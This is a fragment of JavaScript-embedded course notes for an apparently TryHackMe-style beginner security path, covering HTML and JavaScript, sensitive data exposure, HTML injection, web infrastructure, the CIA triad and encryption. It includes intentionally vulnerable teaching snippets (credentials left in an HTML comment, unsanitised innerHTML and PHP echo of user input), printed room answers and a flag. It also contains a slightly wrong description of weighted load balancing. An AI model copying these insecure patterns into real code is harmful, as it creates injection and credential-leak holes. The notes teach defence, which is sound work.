            </ul>
            <h3>Attributes</h3>
            <p>Tags can contain <b>attributes</b>. For example the <code>class</code> attribute can be used to style an element (like making a tag a different colour): <code>&lt;p class="bold-text"&gt;</code>. The <code>src</code> attribute on an image gives the image's location: <code>&lt;img src="img/cat.jpg"&gt;</code>. An element can have several attributes, each with its own purpose, like <code>&lt;p attribute1="value1" attribute2="value2"&gt;</code>.</p>
            <p>Elements can also have an <code>id</code> attribute, e.g. <code>&lt;p id="example"&gt;</code>. An id is <b>unique to the element</b>. Unlike class, where many elements can share the same class, each element must have a different id so it can be identified uniquely. Ids are used for styling and for identifying an element from JavaScript.</p>
            <p><b>Tip:</b> you can view the HTML of any website by right-clicking and choosing <b>View Page Source</b> (Chrome) or <b>Show Page Source</b> (Safari).</p>
            <h3>Hands-on</h3>
            <p>Click <b>View Site</b>. On the right-hand side is a box that renders HTML: type HTML into it and click the green <b>Render HTML Code</b> button to see it rendered (a page with some cat images). The tasks: fix one broken image, which reveals hidden text, and add a dog image by adding another <code>&lt;img&gt;</code> tag on line 11 using the image location given in the room.</p>
            <div class="placeholder">My own takeaways from the exercise: coming soon.</div>`},

          {title:"JavaScript", lab:true, notes:`
            <p><b>JavaScript (JS)</b> is one of the most popular coding languages in the world and lets pages become <b>interactive</b>. HTML builds the structure and content; JavaScript controls the <b>functionality</b>. Without it a page would always be static. JS can update the page in real time, for example change the style of a button when the user clicks it, or show moving animations.</p>
            <p>JavaScript is added in the page source code, either inside <code>&lt;script&gt;</code> tags or loaded from another file with the <code>src</code> attribute:</p>
            <pre><code>&lt;script src="/location/of/javascript_file.js"&gt;&lt;/script&gt;</code></pre>
            <p>This code finds the HTML element with the id <code>demo</code> and changes its contents to "Hack the Planet":</p>
            <pre><code>document.getElementById("demo").innerHTML = "Hack the Planet";</code></pre>
            <p>HTML elements can also have <b>events</b>, such as <code>onclick</code> or <code>onhover</code>, that run JavaScript when they happen. This button changes the text of the element with the id <code>demo</code> to "Button Clicked":</p>
            <pre><code>&lt;button onclick='document.getElementById("demo").innerHTML = "Button Clicked";'&gt;Click Me!&lt;/button&gt;</code></pre>
            <p>onclick events can also be defined inside the script tags instead of directly on the element.</p>
            ${rowSVG("js", ["Event|user clicks the button", "JavaScript|the onclick code runs", "Page updates|#demo text changes"], [1])}
            <div class="placeholder">My own takeaways from the View Site exercise: coming soon.</div>`},

          {title:"Sensitive Data Exposure", lab:true, notes:`
            <p><b>Sensitive Data Exposure</b> happens when a website does not properly protect (or remove) sensitive clear-text information from the end user. It is usually found in a site's <b>front-end source code</b>.</p>
            <p>Websites are built from many HTML elements, all of which we can see by "viewing the page source". A developer may have forgotten to remove login credentials, hidden links to private parts of the site or other sensitive data shown in the HTML or JavaScript.</p>
            <p>That information can help an attacker get further into different parts of a web application. For example, an HTML comment might contain temporary login credentials. If you find them in the page source, you could use them to log in elsewhere on the application (or worse, to reach other back-end components). Example (made-up credentials):</p>
            <pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;Fake Website&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;form&gt;
            &lt;input type='text' name='username'&gt;
            &lt;input type='password' name='password'&gt;
            &lt;button&gt;Login&lt;/button&gt;
            &lt;!-- TODO: remove test credentials admin:password123 --&gt;
        &lt;/form&gt;
    &lt;/body&gt;
&lt;/html&gt;</code></pre>
            ${rowSVG("sde", ["Developer|leaves a note in the code", "Page source|visible to every visitor", "Attacker|reads it and reuses it", "Fix|remove it before release"], [3])}
            <p class="callout"><b>Rule of thumb:</b> when assessing a web application for security issues, one of the first things to do is <b>review the page source</b> for exposed login credentials or hidden links.</p>
            <div class="placeholder">My own takeaways from the View Site exercise: coming soon.</div>`},

          {title:"HTML Injection", lab:true, notes:`
            <p><b>HTML Injection</b> is a vulnerability that happens when <b>unfiltered user input is displayed on the page</b>. If a website does not <b>sanitise</b> user input (filter out any "malicious" text a user enters) and that input is used on the page, an attacker can inject HTML code into a vulnerable website.</p>
            <p>Input sanitisation is very important for keeping a website secure, because user input is often used in other front-end and back-end functionality. Another vulnerability you will meet in a later lab is <b>database injection</b>, where you manipulate a database lookup query (for example to log in as another user) by controlling the input used directly in the query. For now the focus is HTML injection, which is client-side.</p>
            <p>When a user controls how their input is displayed, they can submit HTML (or JavaScript) code and the browser will use it on the page, letting them control the page's appearance and functionality.</p>
            <h3>How it happens</h3>
            ${rowSVG("hi", ["1. User types|a name in the input field", "2. JavaScript|shows the name on the page", "3. No sanitising|HTML is used as code", "Result|attacker controls the page"], [2])}
            <pre><code>&lt;script&gt;
    function sayHi() {
        const name = document.getElementById('name').value
        document.getElementById("welcome-msg").innerHTML = "Welcome " + name
    }
&lt;/script&gt;</code></pre>
            <p>Whatever the user types into the "What's your name?" field is passed to the <code>sayHi</code> JavaScript function and output to the page. If the user adds their own HTML or JavaScript in the field, it is used in <code>sayHi</code> and added to the page. That means you can add your own HTML (such as an <code>&lt;h1&gt;</code> tag) and it will be output as pure HTML.</p>
            <p class="callout"><b>The general rule: never trust user input.</b> To prevent malicious input, the developer should <b>sanitise</b> everything the user enters before using it in the JavaScript function. In this case, the developer could remove any HTML tags.</p>
            <p><b>Room task:</b> use the View Site page to inject HTML so that a link to the address given in the question is shown.</p>
            <div class="placeholder">My own takeaways from the exercise: coming soon.</div>`}
         ]},
        {name:"Putting it all together", text:"Learn how all the individual components of the web work together to bring you access to your favourite web sites.",
         icon:"🧩", level:"easy", time:"15 min", premium:true,
         tasks:[
          {title:"Putting It All Together", notes:`
            <p>From the previous rooms in this module, you have learned that quite a lot goes on behind the scenes when you request a webpage in your browser.</p>
            <p>To summarise the lifecycle of a web request:</p>
            <ol>
              <li><b>DNS Resolution:</b> when you request a website, your computer first needs to find the server's IP address to communicate with; for this, it queries DNS.</li>
              <li><b>HTTP Communication:</b> your computer then talks to the web server using the HTTP/HTTPS protocol on port 80 (HTTP) or port 443 (HTTPS).</li>
              <li><b>Rendering the Response:</b> the web server processes the request and returns HTML, JavaScript, CSS, images, etc., which your browser parses and displays as an interactive webpage.</li>
            </ol>
            ${putTogetherFlowSVG()}
            <p>Along with this basic pipeline, modern websites use several additional infrastructure components to increase speed, maintain high availability, and stay secure.</p>
            <p><b>Room question:</b> Completed reading introductory lifecycle.</p>`},

          {title:"Other Components", notes:`
            <p>When websites grow large or handle sensitive services, a single server is no longer enough. Several architectural components work together to keep sites fast, resilient, and secure.</p>
            
            <h3>1. Load Balancers</h3>
            <p>When website traffic becomes large or requires <b>high availability</b>, one web server is insufficient. A <b>load balancer</b> sits in front of multiple servers, receiving client requests first and forwarding them to backend servers.</p>
            ${loadBalancerSVG()}
            <ul>
              <li><b>Traffic distribution algorithms:</b>
                <ul>
                  <li><b>Round-robin:</b> sends each new request to the next server in turn.</li>
                  <li><b>Weighted:</b> monitors current server load and routes requests to the server handling the fewest active connections.</li>
                </ul>
              </li>
              <li><b>Health Checks:</b> the load balancer performs periodic checks to ensure each backend server is responsive. If a server fails or crashes, traffic is automatically stopped from reaching it until it recovers (failover).</li>
            </ul>

            <h3>2. CDN (Content Delivery Networks)</h3>
            <p>A CDN reduces load on web servers and speeds up page loading for visitors worldwide. It caches and serves static assets (JavaScript, CSS, images, videos) from a global network of edge servers. When a user requests an asset, the CDN delivers it from the physically closest edge node.</p>

            <h3>3. Databases</h3>
            <p>Web servers need a structured way to store, update, and retrieve dynamic information (such as user accounts, posts, orders, and credentials). Common database systems include <b>MySQL</b>, <b>PostgreSQL</b>, <b>MSSQL</b>, and <b>MongoDB</b>.</p>

            <h3>4. WAF (Web Application Firewall)</h3>
            <p>A WAF sits between incoming web traffic and the web server to inspect application-layer requests (HTTP/HTTPS) and prevent attacks.</p>
            ${wafSVG()}
            <ul>
              <li><b>Attack prevention:</b> detects and blocks common web exploits such as SQL Injection, Cross-Site Scripting (XSS), and malicious parameter tampering.</li>
              <li><b>Bot detection:</b> identifies automated scrapers and bots versus real human browsers.</li>
              <li><b>Rate limiting:</b> restricts how many requests a single IP address can make per second, mitigating denial-of-service (DoS) attempts and brute-force attacks.</li>
            </ul>

            <h3>Key Component Summary</h3>
            <table>
              <tr><th>Component</th><th>Primary Purpose</th><th>Key Feature</th></tr>
              <tr><td><b>Load Balancer</b></td><td>Distributes traffic across multiple servers</td><td>High availability, round-robin/weighted routing, health checks</td></tr>
              <tr><td><b>CDN</b></td><td>Delivers static content rapidly</td><td>Geo-distributed edge servers closest to users</td></tr>
              <tr><td><b>Database</b></td><td>Persistent storage of application data</td><td>Relational (SQL) and document-based (NoSQL) engines</td></tr>
              <tr><td><b>WAF</b></td><td>Protects web apps from attacks</td><td>Filters malicious traffic, bot detection, rate limiting</td></tr>
            </table>

            <p><b>Room questions covered:</b></p>
            <ul>
              <li><i>What can be used to host static files and speed up a client's visit to a website?</i> <b>CDN</b></li>
              <li><i>What does a load balancer perform to make sure a host is still alive?</i> <b>health check</b></li>
              <li><i>What can be used to help against the hacking of a website?</i> <b>WAF</b></li>
            </ul>`},

          {title:"How Web Servers Work", notes:`
            <h3>What is a Web Server?</h3>
            <p>A <b>web server</b> is software that listens for incoming client network connections and uses the HTTP/HTTPS protocol to serve content. Popular web server software includes <b>Apache</b>, <b>Nginx</b>, <b>IIS (Microsoft Internet Information Services)</b>, and <b>Node.js</b>.</p>
            <p>Web servers deliver files from a configured root directory on the system:</p>
            <ul>
              <li><b>Linux default root:</b> <code>/var/www/html</code> (for Apache / Nginx)</li>
              <li><b>Windows IIS default root:</b> <code>C:\\inetpub\\wwwroot</code></li>
            </ul>
            <p>For instance, requesting <code>http://www.example.com/picture.jpg</code> causes the server to look up <code>/var/www/html/picture.jpg</code> on its disk and stream the file back.</p>

            <h3>Virtual Hosts</h3>
            <p>A single physical server and IP address can host dozens or hundreds of different websites using <b>Virtual Hosts</b> (or server blocks in Nginx). When a request arrives, the server inspects the HTTP <code>Host</code> header to determine which site was requested, then routes the request to that site's specific folder (e.g. <code>/var/www/website_one</code> vs <code>/var/www/website_two</code>).</p>

            <h3>Static vs Dynamic Content</h3>
            <table>
              <tr><th>Type</th><th>Description</th><th>Examples</th></tr>
              <tr><td><b>Static Content</b></td><td>Files stored directly on disk that are returned unchanged to the client. Fast to serve.</td><td>HTML files, CSS stylesheets, client-side JavaScript, images, PDF documents.</td></tr>
              <tr><td><b>Dynamic Content</b></td><td>Content generated on-the-fly by backend code for each specific request.</td><td>User dashboards, search result listings, shopping carts, database-driven pages.</td></tr>
            </table>

            <h3>Frontend vs Backend</h3>
            <p><b>Frontend (Client-side):</b> everything executed in the user's browser (HTML structure, CSS styles, JavaScript interactions). Users can always view page source.</p>
            <p><b>Backend (Server-side):</b> code running on the web server (written in PHP, Python, Ruby, Node.js, C#, Go, etc.). Backend scripts query databases, enforce business logic, and output raw HTML to the client.</p>
            <p><b>PHP Example:</b></p>
            <pre><code>&lt;html&gt;&lt;body&gt;Hello &lt;?php echo $_GET["name"]; ?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre>
            <p>If requested with <code>?name=adam</code>, the server executes the PHP and outputs:</p>
            <pre><code>&lt;html&gt;&lt;body&gt;Hello adam&lt;/body&gt;&lt;/html&gt;</code></pre>
            <p class="callout"><b>Security note:</b> the client <i>never</i> sees the backend PHP code, only the generated HTML output. However, dynamically outputting unvalidated user input opens vulnerabilities like HTML Injection or XSS.</p>

            <p><b>Room questions covered:</b></p>
            <ul>
              <li><i>What does web server software use to host multiple sites?</i> <b>Virtual Hosts</b></li>
              <li><i>What is the name for the type of content that can change?</i> <b>Dynamic</b></li>
              <li><i>Does the client see the backend code?</i> <b>Nay</b></li>
            </ul>`},

          {title:"Quiz", lab:true, notes:`
            <p>This hands-on lab tests your understanding of the complete request-response journey from start to finish.</p>
            <h3>Interactive Order Lab</h3>
            <p>Click <b>View Site</b> to launch the interactive simulation. Drag and drop the tiles into the correct chronological order of how a web request travels across the internet:</p>
            <ol>
              <li>Request website in your browser (enter URL)</li>
              <li>Check local cache for IP address</li>
              <li>Check recursive DNS server for address</li>
              <li>Query root server to find authoritative DNS server</li>
              <li>Authoritative DNS server advises the IP address for the website</li>
              <li>Connect to web server on port 80 or 443</li>
              <li>Web server receives the GET request</li>
              <li>Web server communicates with backend/database if dynamic</li>
              <li>Web server returns HTML / webpage data</li>
              <li>Browser parses and renders HTML into the interactive website</li>
            </ol>
            <p class="callout"><b>Room Flag:</b> <code>THM{YOU_GOT_THE_ORDER}</code></p>
            <div class="placeholder">My personal takeaways and practical notes from this lab: coming soon.</div>`}
         ]}
       ]},
      {icon:"🛡️", title:"Attacks and Defenses", intro:"This module introduces core cyber security concepts by exploring how systems are attacked and defended. You'll discover what the CIA Triad is, how cryptography keeps data safe, and what it means to think like both a hacker and a defender. By the end, you'll have a solid foundation for understanding how cyber attacks happen and how they're stopped.", text:"Learn how attackers and defenders think, how data is protected, and how real world systems are attacked and defended in practice.",
       rooms:[
        {name:"The CIA Triad", text:"Understand the CIA Triad and how it shapes cyber security mindset.",
         icon:"🔺", level:"easy", time:"30 min",
         tasks:[
          {title:"Introduction", notes:`
            <p>After learning how computers, operating systems, software, networks and the web work, this room starts the actual cyber security journey: what does cyber security protect inside the digital world? The answer is three key aspects of digital data.</p>
            <h3>Learning objectives</h3>
            <ul>
              <li>Understand the pillars of cyber security</li>
              <li>Understand the purpose of Confidentiality, Integrity and Availability</li>
              <li>Recognise each of them in simple scenarios</li>
              <li>Make decisions that preserve these core aspects</li>
            </ul>
            <h3>Prerequisites</h3>
            <p>Complete all the previous modules in the Pre Security path.</p>`},

          {title:"Understanding the CIA Triad", notes:`
            <p>Information used to live on paper; now it is digital data stored on systems and sent over networks. Unprotected, it can be exposed to the wrong people, changed without permission, or be unavailable when it is needed most.</p>
            <p>Being "secure" does not just mean having security tools or stopping attacks. It means guaranteeing specific conditions for the data. These are the three pillars of the <b>CIA Triad</b>: <b>Confidentiality, Integrity, Availability</b>. Almost everything in cyber security (attack or defence) revolves around keeping these intact.</p>

            <h3>1. Confidentiality</h3>
            <p>Sensitive data can only be accessed by authorised people. If it fails, the result can be financial loss, privacy violations or legal trouble.</p>
            <ul>
              <li><b>Real world:</b> a stranger listens to a private talk and later uses it to manipulate you. Fix: talk in a secure place and watch your surroundings.</li>
              <li><b>Digital:</b> logging in to social media on public coffee-shop Wi-Fi and having your credentials intercepted.</li>
              <li><b>How it is protected:</b> encryption and access controls.</li>
            </ul>
            <table>
              <tr><th>Situation</th><th>Confidentiality achieved?</th></tr>
              <tr><td>Gmail credentials written on a sticky note on your desk</td><td><span class="no">No</span></td></tr>
              <tr><td>Internal documents available only to employees who need them</td><td><span class="yes">Yes</span></td></tr>
              <tr><td>A personal document available on the internet</td><td><span class="no">No</span></td></tr>
            </table>

            <h3>2. Integrity</h3>
            <p>Data is not modified by unauthorised people. Without integrity, data can no longer be trusted, and unauthorised changes can be dangerous.</p>
            <ul>
              <li><b>Real world:</b> your exam grade is changed before it reaches the examination authority. Fix: record grades separately and verify them before submission.</li>
              <li><b>Digital:</b> a bank transfer is intercepted and the receiving account is changed, so the money goes to the wrong place.</li>
            </ul>
            <table>
              <tr><th>Situation</th><th>Integrity achieved?</th></tr>
              <tr><td>Data changed through authorised approval</td><td><span class="yes">Yes</span></td></tr>
              <tr><td>Attendance records changed after the teacher locked them</td><td><span class="no">No</span></td></tr>
              <tr><td>Order price modified before checkout</td><td><span class="no">No</span></td></tr>
            </table>

            <h3>3. Availability</h3>
            <p>Data and services are accessible to authorised users when needed. Businesses depend on their digital services, and even short downtime can cause serious loss.</p>
            <ul>
              <li><b>Real world:</b> a very secure bank is closed because of a power failure, so you cannot reach your money. Fix: a backup power generator.</li>
              <li><b>Digital:</b> attackers flood a website with more requests than it can handle and it goes down. No data is leaked or changed, but availability is lost. Fix: manage traffic load and block requests above a threshold.</li>
            </ul>
            <table>
              <tr><th>Situation</th><th>Availability achieved?</th></tr>
              <tr><td>Critical services disrupted by installing software</td><td><span class="no">No</span></td></tr>
              <tr><td>Company website went offline during business hours</td><td><span class="no">No</span></td></tr>
              <tr><td>All systems accessible to employees during working hours</td><td><span class="yes">Yes</span></td></tr>
            </table>`},

          {title:"The Security Mindset", lab:true, notes:`
            <p>The CIA Triad is more than three definitions. It is how security professionals think. After an incident they ask which pillar was hit:</p>
            <ul>
              <li>Was sensitive data exposed to unauthorised people? (<b>Confidentiality</b>)</li>
              <li>Was data modified without permission? (<b>Integrity</b>)</li>
              <li>Were systems or services unavailable when users needed them? (<b>Availability</b>)</li>
            </ul>
            <p>Knowing each pillar lets you judge the impact of an incident and choose a suitable response.</p>
            <h3>Hands-on lab</h3>
            <p>Read nine security incidents one by one and drag each into the pillar it affects the most: Confidentiality, Integrity or Availability.</p>
            <div class="placeholder">My own takeaways from the lab: coming soon.</div>`},

          {title:"Conclusion", notes:`
            <p>This room is the first step into cyber security: what exactly are we protecting? The CIA Triad is the core mindset behind many later concepts.</p>
            <h3>Key terminology</h3>
            <table>
              <tr><th>Term</th><th>Meaning</th></tr>
              <tr><td>Confidentiality</td><td>Digital information is not available to unauthorised individuals.</td></tr>
              <tr><td>Integrity</td><td>Digital information is not modified without permission.</td></tr>
              <tr><td>Availability</td><td>Digital information is available when it is needed.</td></tr>
            </table>
            <p>Next: the other rooms in this module cover more areas of cyber security with practical exercises.</p>`}
         ]},
        {name:"Cryptography Concepts", text:"This room provides an understanding of cryptography in our everyday digital encounters.",
         icon:"🔐", level:"easy", time:"60 min",
         tasks:[
          {title:"Introduction", notes:`
            <p class="callout"><b>Opening question:</b> when you see the padlock in your browser's address bar, what is actually stopping someone from reading or changing your data as it travels across the internet?</p>
            ${plainCipherSVG()}
            <h3>Why cryptography matters</h3>
            <p>The CIA Triad (confidentiality, integrity, availability) tells us <i>what</i> to protect. The practical question is <b>how do we protect secrets and detect tampering in the real world?</b> The answer is <b>cryptography</b>.</p>
            <h3>A real-world scenario</h3>
            <p>A small medical clinic sends patient records (names, conditions, treatment history) to specialists and insurers over the internet. The data does not go straight to the recipient. It passes through dozens of computers and routers, and anyone with access to those systems could read, change or block it.</p>
            <p>Cryptography solves this with <b>mathematical rules and secret keys</b> that scramble information into gibberish that only authorised people can unscramble. No maths background is needed for this room.</p>
            <h3>Learning objectives</h3>
            <ul>
              <li>Explain what cryptography is and why it protects confidentiality and integrity</li>
              <li>Describe plaintext vs ciphertext with examples</li>
              <li>Explain what keys and algorithms are, and why the key must stay secret</li>
              <li>Explain symmetric vs asymmetric encryption using lockboxes and mailboxes</li>
              <li>Describe how both work together to protect web browsing</li>
            </ul>
            <h3>Prerequisites</h3>
            <p>All previous modules, especially the <b>CIA Triad</b> and <b>Data Encoding</b> rooms.</p>`},

          {title:"Hiding Information - Symmetric Encryption", lab:true, notes:`
            <p class="callout"><b>Opening question:</b> if someone is listening to every piece of data travelling between two people, how can those two people still share secrets?</p>
            <h3>The basics: four core terms</h3>
            <table>
              <tr><th>Term</th><th>Meaning</th></tr>
              <tr><td>Plaintext</td><td>A message you can read normally, like <code>HELLO</code>.</td></tr>
              <tr><td>Ciphertext</td><td>A scrambled version that makes no sense, like <code>KHOOR</code>.</td></tr>
              <tr><td>Key</td><td>The secret ingredient that controls the scrambling and unscrambling. Think of it as a password the algorithm uses.</td></tr>
              <tr><td>Algorithm</td><td>The public recipe: the set of steps that explain how to use the key on the message. Everyone can know the algorithm. <b>The security comes from keeping the key secret.</b></td></tr>
            </table>
            <p><b>Encryption:</b> plaintext + algorithm + key → ciphertext<br><b>Decryption:</b> ciphertext + algorithm + key → plaintext</p>
            ${flowSVG("sym", ["Plaintext","Encrypt","Ciphertext","Decrypt","Plaintext"], ["🔑 key","🔑 same key"], "Encryption: plaintext + algorithm + key → ciphertext", "Decryption: ciphertext + algorithm + key → plaintext")}

            <h3>The lockbox analogy</h3>
            <ul>
              <li><b>Algorithm</b> = how the lock works. Anyone can see how it works, so it is not a secret.</li>
              <li><b>Key</b> = your specific metal key. Only people with that exact key can open the box.</li>
              <li><b>Plaintext</b> = the letter inside the box.</li>
              <li><b>Ciphertext</b> = the locked box travelling through the postal system.</li>
            </ul>
            <p>Nobody tries to hide how locks work to make them secure. Security comes from keeping your key private. Algorithms are public and tested by experts worldwide.</p>
            <ol>
              <li>Alice writes her message (plaintext) on paper.</li>
              <li>She puts it in a sturdy lockbox.</li>
              <li>She locks it with a padlock using her key.</li>
              <li>She sends the locked box (ciphertext) through the mail.</li>
            </ol>
            <p>Bob has a copy of the same key, so he unlocks the box and reads the message. Anyone who intercepts the box on the way only gets a locked box they cannot open. That is <b>symmetric encryption</b> in a nutshell: <b>one key locks, the same key unlocks.</b></p>
            ${lockboxSVG()}

            <h3>Plaintext versus ciphertext</h3>
            <p>Alice wants to send <code>HELLO</code> (the plaintext). Her algorithm and secret key scramble it into <code>KHOOR</code> (the ciphertext). To anyone without the key it is meaningless, and it should look like random nonsense to everyone who does not have the key. Bob receives <code>KHOOR</code>, uses the same key and algorithm, and gets <code>HELLO</code> back.</p>

            <h3>The Caesar cipher: algorithm plus key</h3>
            <p>A simple cipher named after Julius Caesar, who reportedly used it to send military messages over 2000 years ago. It shifts each letter by a fixed number of positions in the alphabet. <b>That fixed number is the key.</b></p>
            ${caesarSVG()}
            <p><b>Encrypt <code>HELLO</code> with key 3:</b> H→K, E→H, L→O, L→O, O→R, giving <code>KHOOR</code>. <b>Decrypt:</b> shift each letter back by 3.</p>
            <ul>
              <li>The <b>algorithm</b> (shift each letter by some number) is public.</li>
              <li>The <b>key</b> (the number 3 here) is the secret that only Alice and Bob know.</li>
            </ul>
            <p><b>Warning:</b> the Caesar cipher is <b>not secure</b> and is never used in real systems. There are only 25 possible shifts, so a computer can try them all in a moment. It is used here only because it is simple. Real systems use algorithms like <b>AES (Advanced Encryption Standard)</b>, which follows the same idea: algorithm + key + plaintext → ciphertext.</p>

            <h3>Symmetric encryption explained</h3>
            <p>The Caesar cipher is symmetric because the <b>same key both encrypts and decrypts</b>, and both sender and receiver need a copy that stays secret from everyone else.</p>
            <ul>
              <li><b>Fast:</b> symmetric algorithms can process huge amounts of data quickly.</li>
              <li><b>Efficient:</b> perfect for encrypting files, hard drives and network traffic.</li>
            </ul>
            <h3>The catch: the key distribution problem</h3>
            <p>How do Alice and Bob share the key safely in the first place? If they send it over the internet in plain sight, an eavesdropper grabs it and can read every future message. If they encrypt the key, they need another key to do that, and another for that one, and so on forever. This is the <b>key distribution problem</b>, the Achilles' heel of symmetric encryption used alone. <b>Asymmetric encryption</b> (next task) solves it.</p>

            <h3>Hands-on: "Secret Message Rescue" game</h3>
            <p>You help a security team that is being monitored on its office Wi-Fi. They use a simple Caesar cipher to communicate. Use different shift keys, watch the message change, then decrypt the intercepted secret warnings and encrypt new messages before sending them. Click <b>View Site</b>, complete all levels to get a flag, then answer the questions: the flag, encrypt <code>CYBER</code> with a key of 5, and decode a given secret message by finding the right key.</p>
            <div class="placeholder">My own takeaways from the game: coming soon.</div>`},

          {title:"Sharing Keys Safely: Asymmetric Encryption", notes:`
            <p class="callout"><b>Opening question:</b> if Alice and Bob have never met and cannot safely send a key over the internet, how can they start encrypting messages to each other?</p>
            <h3>The key distribution problem</h3>
            <p>Symmetric encryption is fast and efficient, but both people need the same key. Sending it in plaintext lets an attacker grab it, and encrypting it needs another key, which brings us back to the same problem. Enter <b>asymmetric encryption</b>.</p>
            <h3>Two keys instead of one</h3>
            <p>Asymmetric encryption uses <b>two mathematically linked keys</b>:</p>
            <ul>
              <li>a <b>public key</b> that anyone can know and use</li>
              <li>a <b>private key</b> that only one person keeps secret</li>
            </ul>
            <p>If you encrypt something with someone's <b>public key</b>, only their <b>private key</b> can decrypt it. (If you encrypt with the private key, anyone with the public key can decrypt it. That is mainly used for digital signatures, covered later.) The keys are connected by serious maths, but an ordinary computer would need hundreds or thousands of years to work out the private key from the public key. That difficulty is what makes asymmetric encryption secure.</p>

            <h3>The mailbox analogy</h3>
            <ul>
              <li>The <b>mail slot</b> at the top is the <b>public key</b>. Anyone walking by can drop a letter in, so it is completely open and accessible.</li>
              <li>The <b>locked door</b> at the front is the <b>private key</b>. Only the mailbox owner has the key to open it and take the letters.</li>
            </ul>
            ${mailboxSVG()}
            <p>When Alice wants to send Bob a secret:</p>
            <ol>
              <li>Alice finds Bob's public key (the mail slot). It is not a secret, since Bob can post it on his website or email it around.</li>
              <li>Alice writes her message, encrypts it with Bob's public key, and sends it.</li>
              <li>Only Bob can decrypt it, because he is the only one with the private key (the key to the door).</li>
            </ol>
            <p>Even if an attacker intercepts the encrypted message, they cannot decrypt it without Bob's private key.</p>

            <h3>Solving the key distribution problem</h3>
            <p>Alice and Bob no longer need to share a secret key beforehand:</p>
            <ol>
              <li>Bob creates a <b>public key</b> and a <b>private key</b>.</li>
              <li>He keeps the private key to himself and shares the public key with the world.</li>
              <li>Alice grabs Bob's public key, encrypts her message with it, and sends it.</li>
              <li>Bob receives it and decrypts it using his private key.</li>
            </ol>
            ${flowSVG("asym", ["Plaintext","Encrypt","Ciphertext","Decrypt","Plaintext"], ["🔓 Bob's public key","🔑 Bob's private key"], "Alice encrypts with Bob's PUBLIC key", "Only Bob's PRIVATE key can decrypt it")}
            <p>At no point did they exchange a key over the network secretly. The only key that travelled publicly was Bob's public key, which is not secret by design.</p>

            <h3>Real-world use: HTTPS</h3>
            <p>The most common everyday use of asymmetric encryption is <b>HTTPS</b>, the secure protocol you use whenever you see the padlock in your browser. When you visit <code>https://google.com</code>:</p>
            <ol>
              <li>Your browser requests the website's public key.</li>
              <li>The website sends back its public key wrapped in a <b>certificate</b>.</li>
              <li>Your browser and the website use asymmetric encryption to agree on a <b>shared secret (symmetric) key</b>, without anyone else being able to see it.</li>
              <li>From then on, they switch to fast symmetric encryption using that shared secret for the rest of the session.</li>
            </ol>
            ${httpsSVG()}
            <p>Asymmetric encryption solves key distribution; symmetric encryption does the heavy lifting because it is faster.</p>

            <h3>Certificates</h3>
            <p>How does Alice know the public key really belongs to Bob and not to an attacker pretending to be Bob? That is where <b>certificates</b> come in. A certificate is a digital document that:</p>
            <ul>
              <li>contains someone's public key</li>
              <li>states who the key belongs to (like <code>example.com</code>)</li>
              <li>is digitally signed by a trusted <b>Certificate Authority (CA)</b></li>
            </ul>
            ${certSVG()}
            <p>Your browser and operating system come preloaded with a list of trusted CAs. When a website hands over a certificate, the browser checks that a trusted CA signed it and that it is still valid (not expired or revoked). If all is good, you get the padlock. If something is off, such as an expired certificate or one signed by an untrusted authority, the browser shows a warning and may refuse to connect.</p>
            <h3>Viewing a certificate in your browser</h3>
            <ol>
              <li>Visit any HTTPS site (for example <code>https://www.tryhackme.com</code>).</li>
              <li>Click the padlock icon in the address bar.</li>
              <li>Look for "Certificate", "Connection is secure" or "View certificate".</li>
              <li>A window shows <b>Issued to</b> (the website), <b>Issued by</b> (the CA that signed it) and <b>Valid from / Valid until</b> (the expiry dates).</li>
            </ol>
            <p>This is how your browser knows it is talking to the real website and not an attacker's fake version.</p>

            <h3>Symmetric vs asymmetric: side by side</h3>
            <table>
              <tr><th>Feature</th><th>Symmetric encryption</th><th>Asymmetric encryption</th></tr>
              <tr><td>Number of keys</td><td>One key for both encrypting and decrypting</td><td>Two keys: public and private</td></tr>
              <tr><td>Key sharing</td><td>Both people need the same secret key</td><td>The public key can be shared openly</td></tr>
              <tr><td>Speed</td><td>Very fast</td><td>Slower (good for small amounts of data)</td></tr>
              <tr><td>Main use</td><td>Encrypting bulk data (files, network traffic)</td><td>Sharing keys, securing and verifying digital certificates</td></tr>
              <tr><td>Analogy</td><td>One key locks and unlocks a box</td><td>A mailbox: anyone posts, only the owner retrieves</td></tr>
            </table>
            <p>Real systems use <b>both</b>: asymmetric encryption starts a connection and securely shares a symmetric key, then symmetric encryption handles the rest of the session. This is how HTTPS, VPNs and encrypted messaging apps all operate.</p>
            <p><b>Room questions covered:</b> which key stays secret in asymmetric encryption, whether Alice encrypts with Bob's public key and only Bob's private key decrypts it, what problem asymmetric solves that symmetric cannot, and which type handles bulk data after the HTTPS exchange.</p>`},

          {title:"Conclusion", notes:`
            <h3>What we covered</h3>
            <p>The basics of cryptography and its role in protecting <b>confidentiality</b>, one of the three pillars of the CIA Triad.</p>
            <ul>
              <li><b>Plaintext</b> is what you can read. <b>Ciphertext</b> is scrambled gibberish.</li>
              <li>A <b>key</b> is the secret that controls scrambling and unscrambling.</li>
              <li>An <b>algorithm</b> is the public method for using the key.</li>
            </ul>
            <p>Two flavours of encryption:</p>
            <ul>
              <li><b>Symmetric:</b> a single key for both encryption and decryption. Fast and efficient, but you need a secure way to share the key. The Caesar cipher showed how it works.</li>
              <li><b>Asymmetric:</b> two linked keys, a public key anyone can use and a private key only one person keeps. It solves the key distribution problem and powers the initial handshake of HTTPS.</li>
            </ul>
            <p>Real systems combine both: asymmetric encryption sets up a shared key at the start, and symmetric encryption handles the actual data because it is faster. That combination protects your passwords, banking details and messages when you see the padlock.</p>
            <h3>Cryptography is not magic</h3>
            <p>It is one of a defender's most critical tools, protecting confidentiality and integrity and backing almost every secure system online. But it is only one layer in a bigger security picture:</p>
            <ul>
              <li>Strong password practices</li>
              <li>Secure key storage</li>
              <li>User awareness and training</li>
              <li>Regular software updates</li>
              <li>Monitoring and incident response</li>
            </ul>
            <p>Understanding how crypto works, and where it can fail, helps you think more carefully about those other layers.</p>
            <h3>Further learning</h3>
            <p>The next rooms in this module are <b>Become a Hacker</b> and <b>Become a Defender</b>, covering offensive and defensive security with some fun exercises.</p>`}
         ]},
        {name:"Become a Hacker", text:"Explore offensive security, the hacker mindset, and hack a web app to improve security!",
         icon:"🐞", level:"easy", time:"30 min", premium:true,
         tasks:[
          {title:"What Is Offensive Security?", notes:`
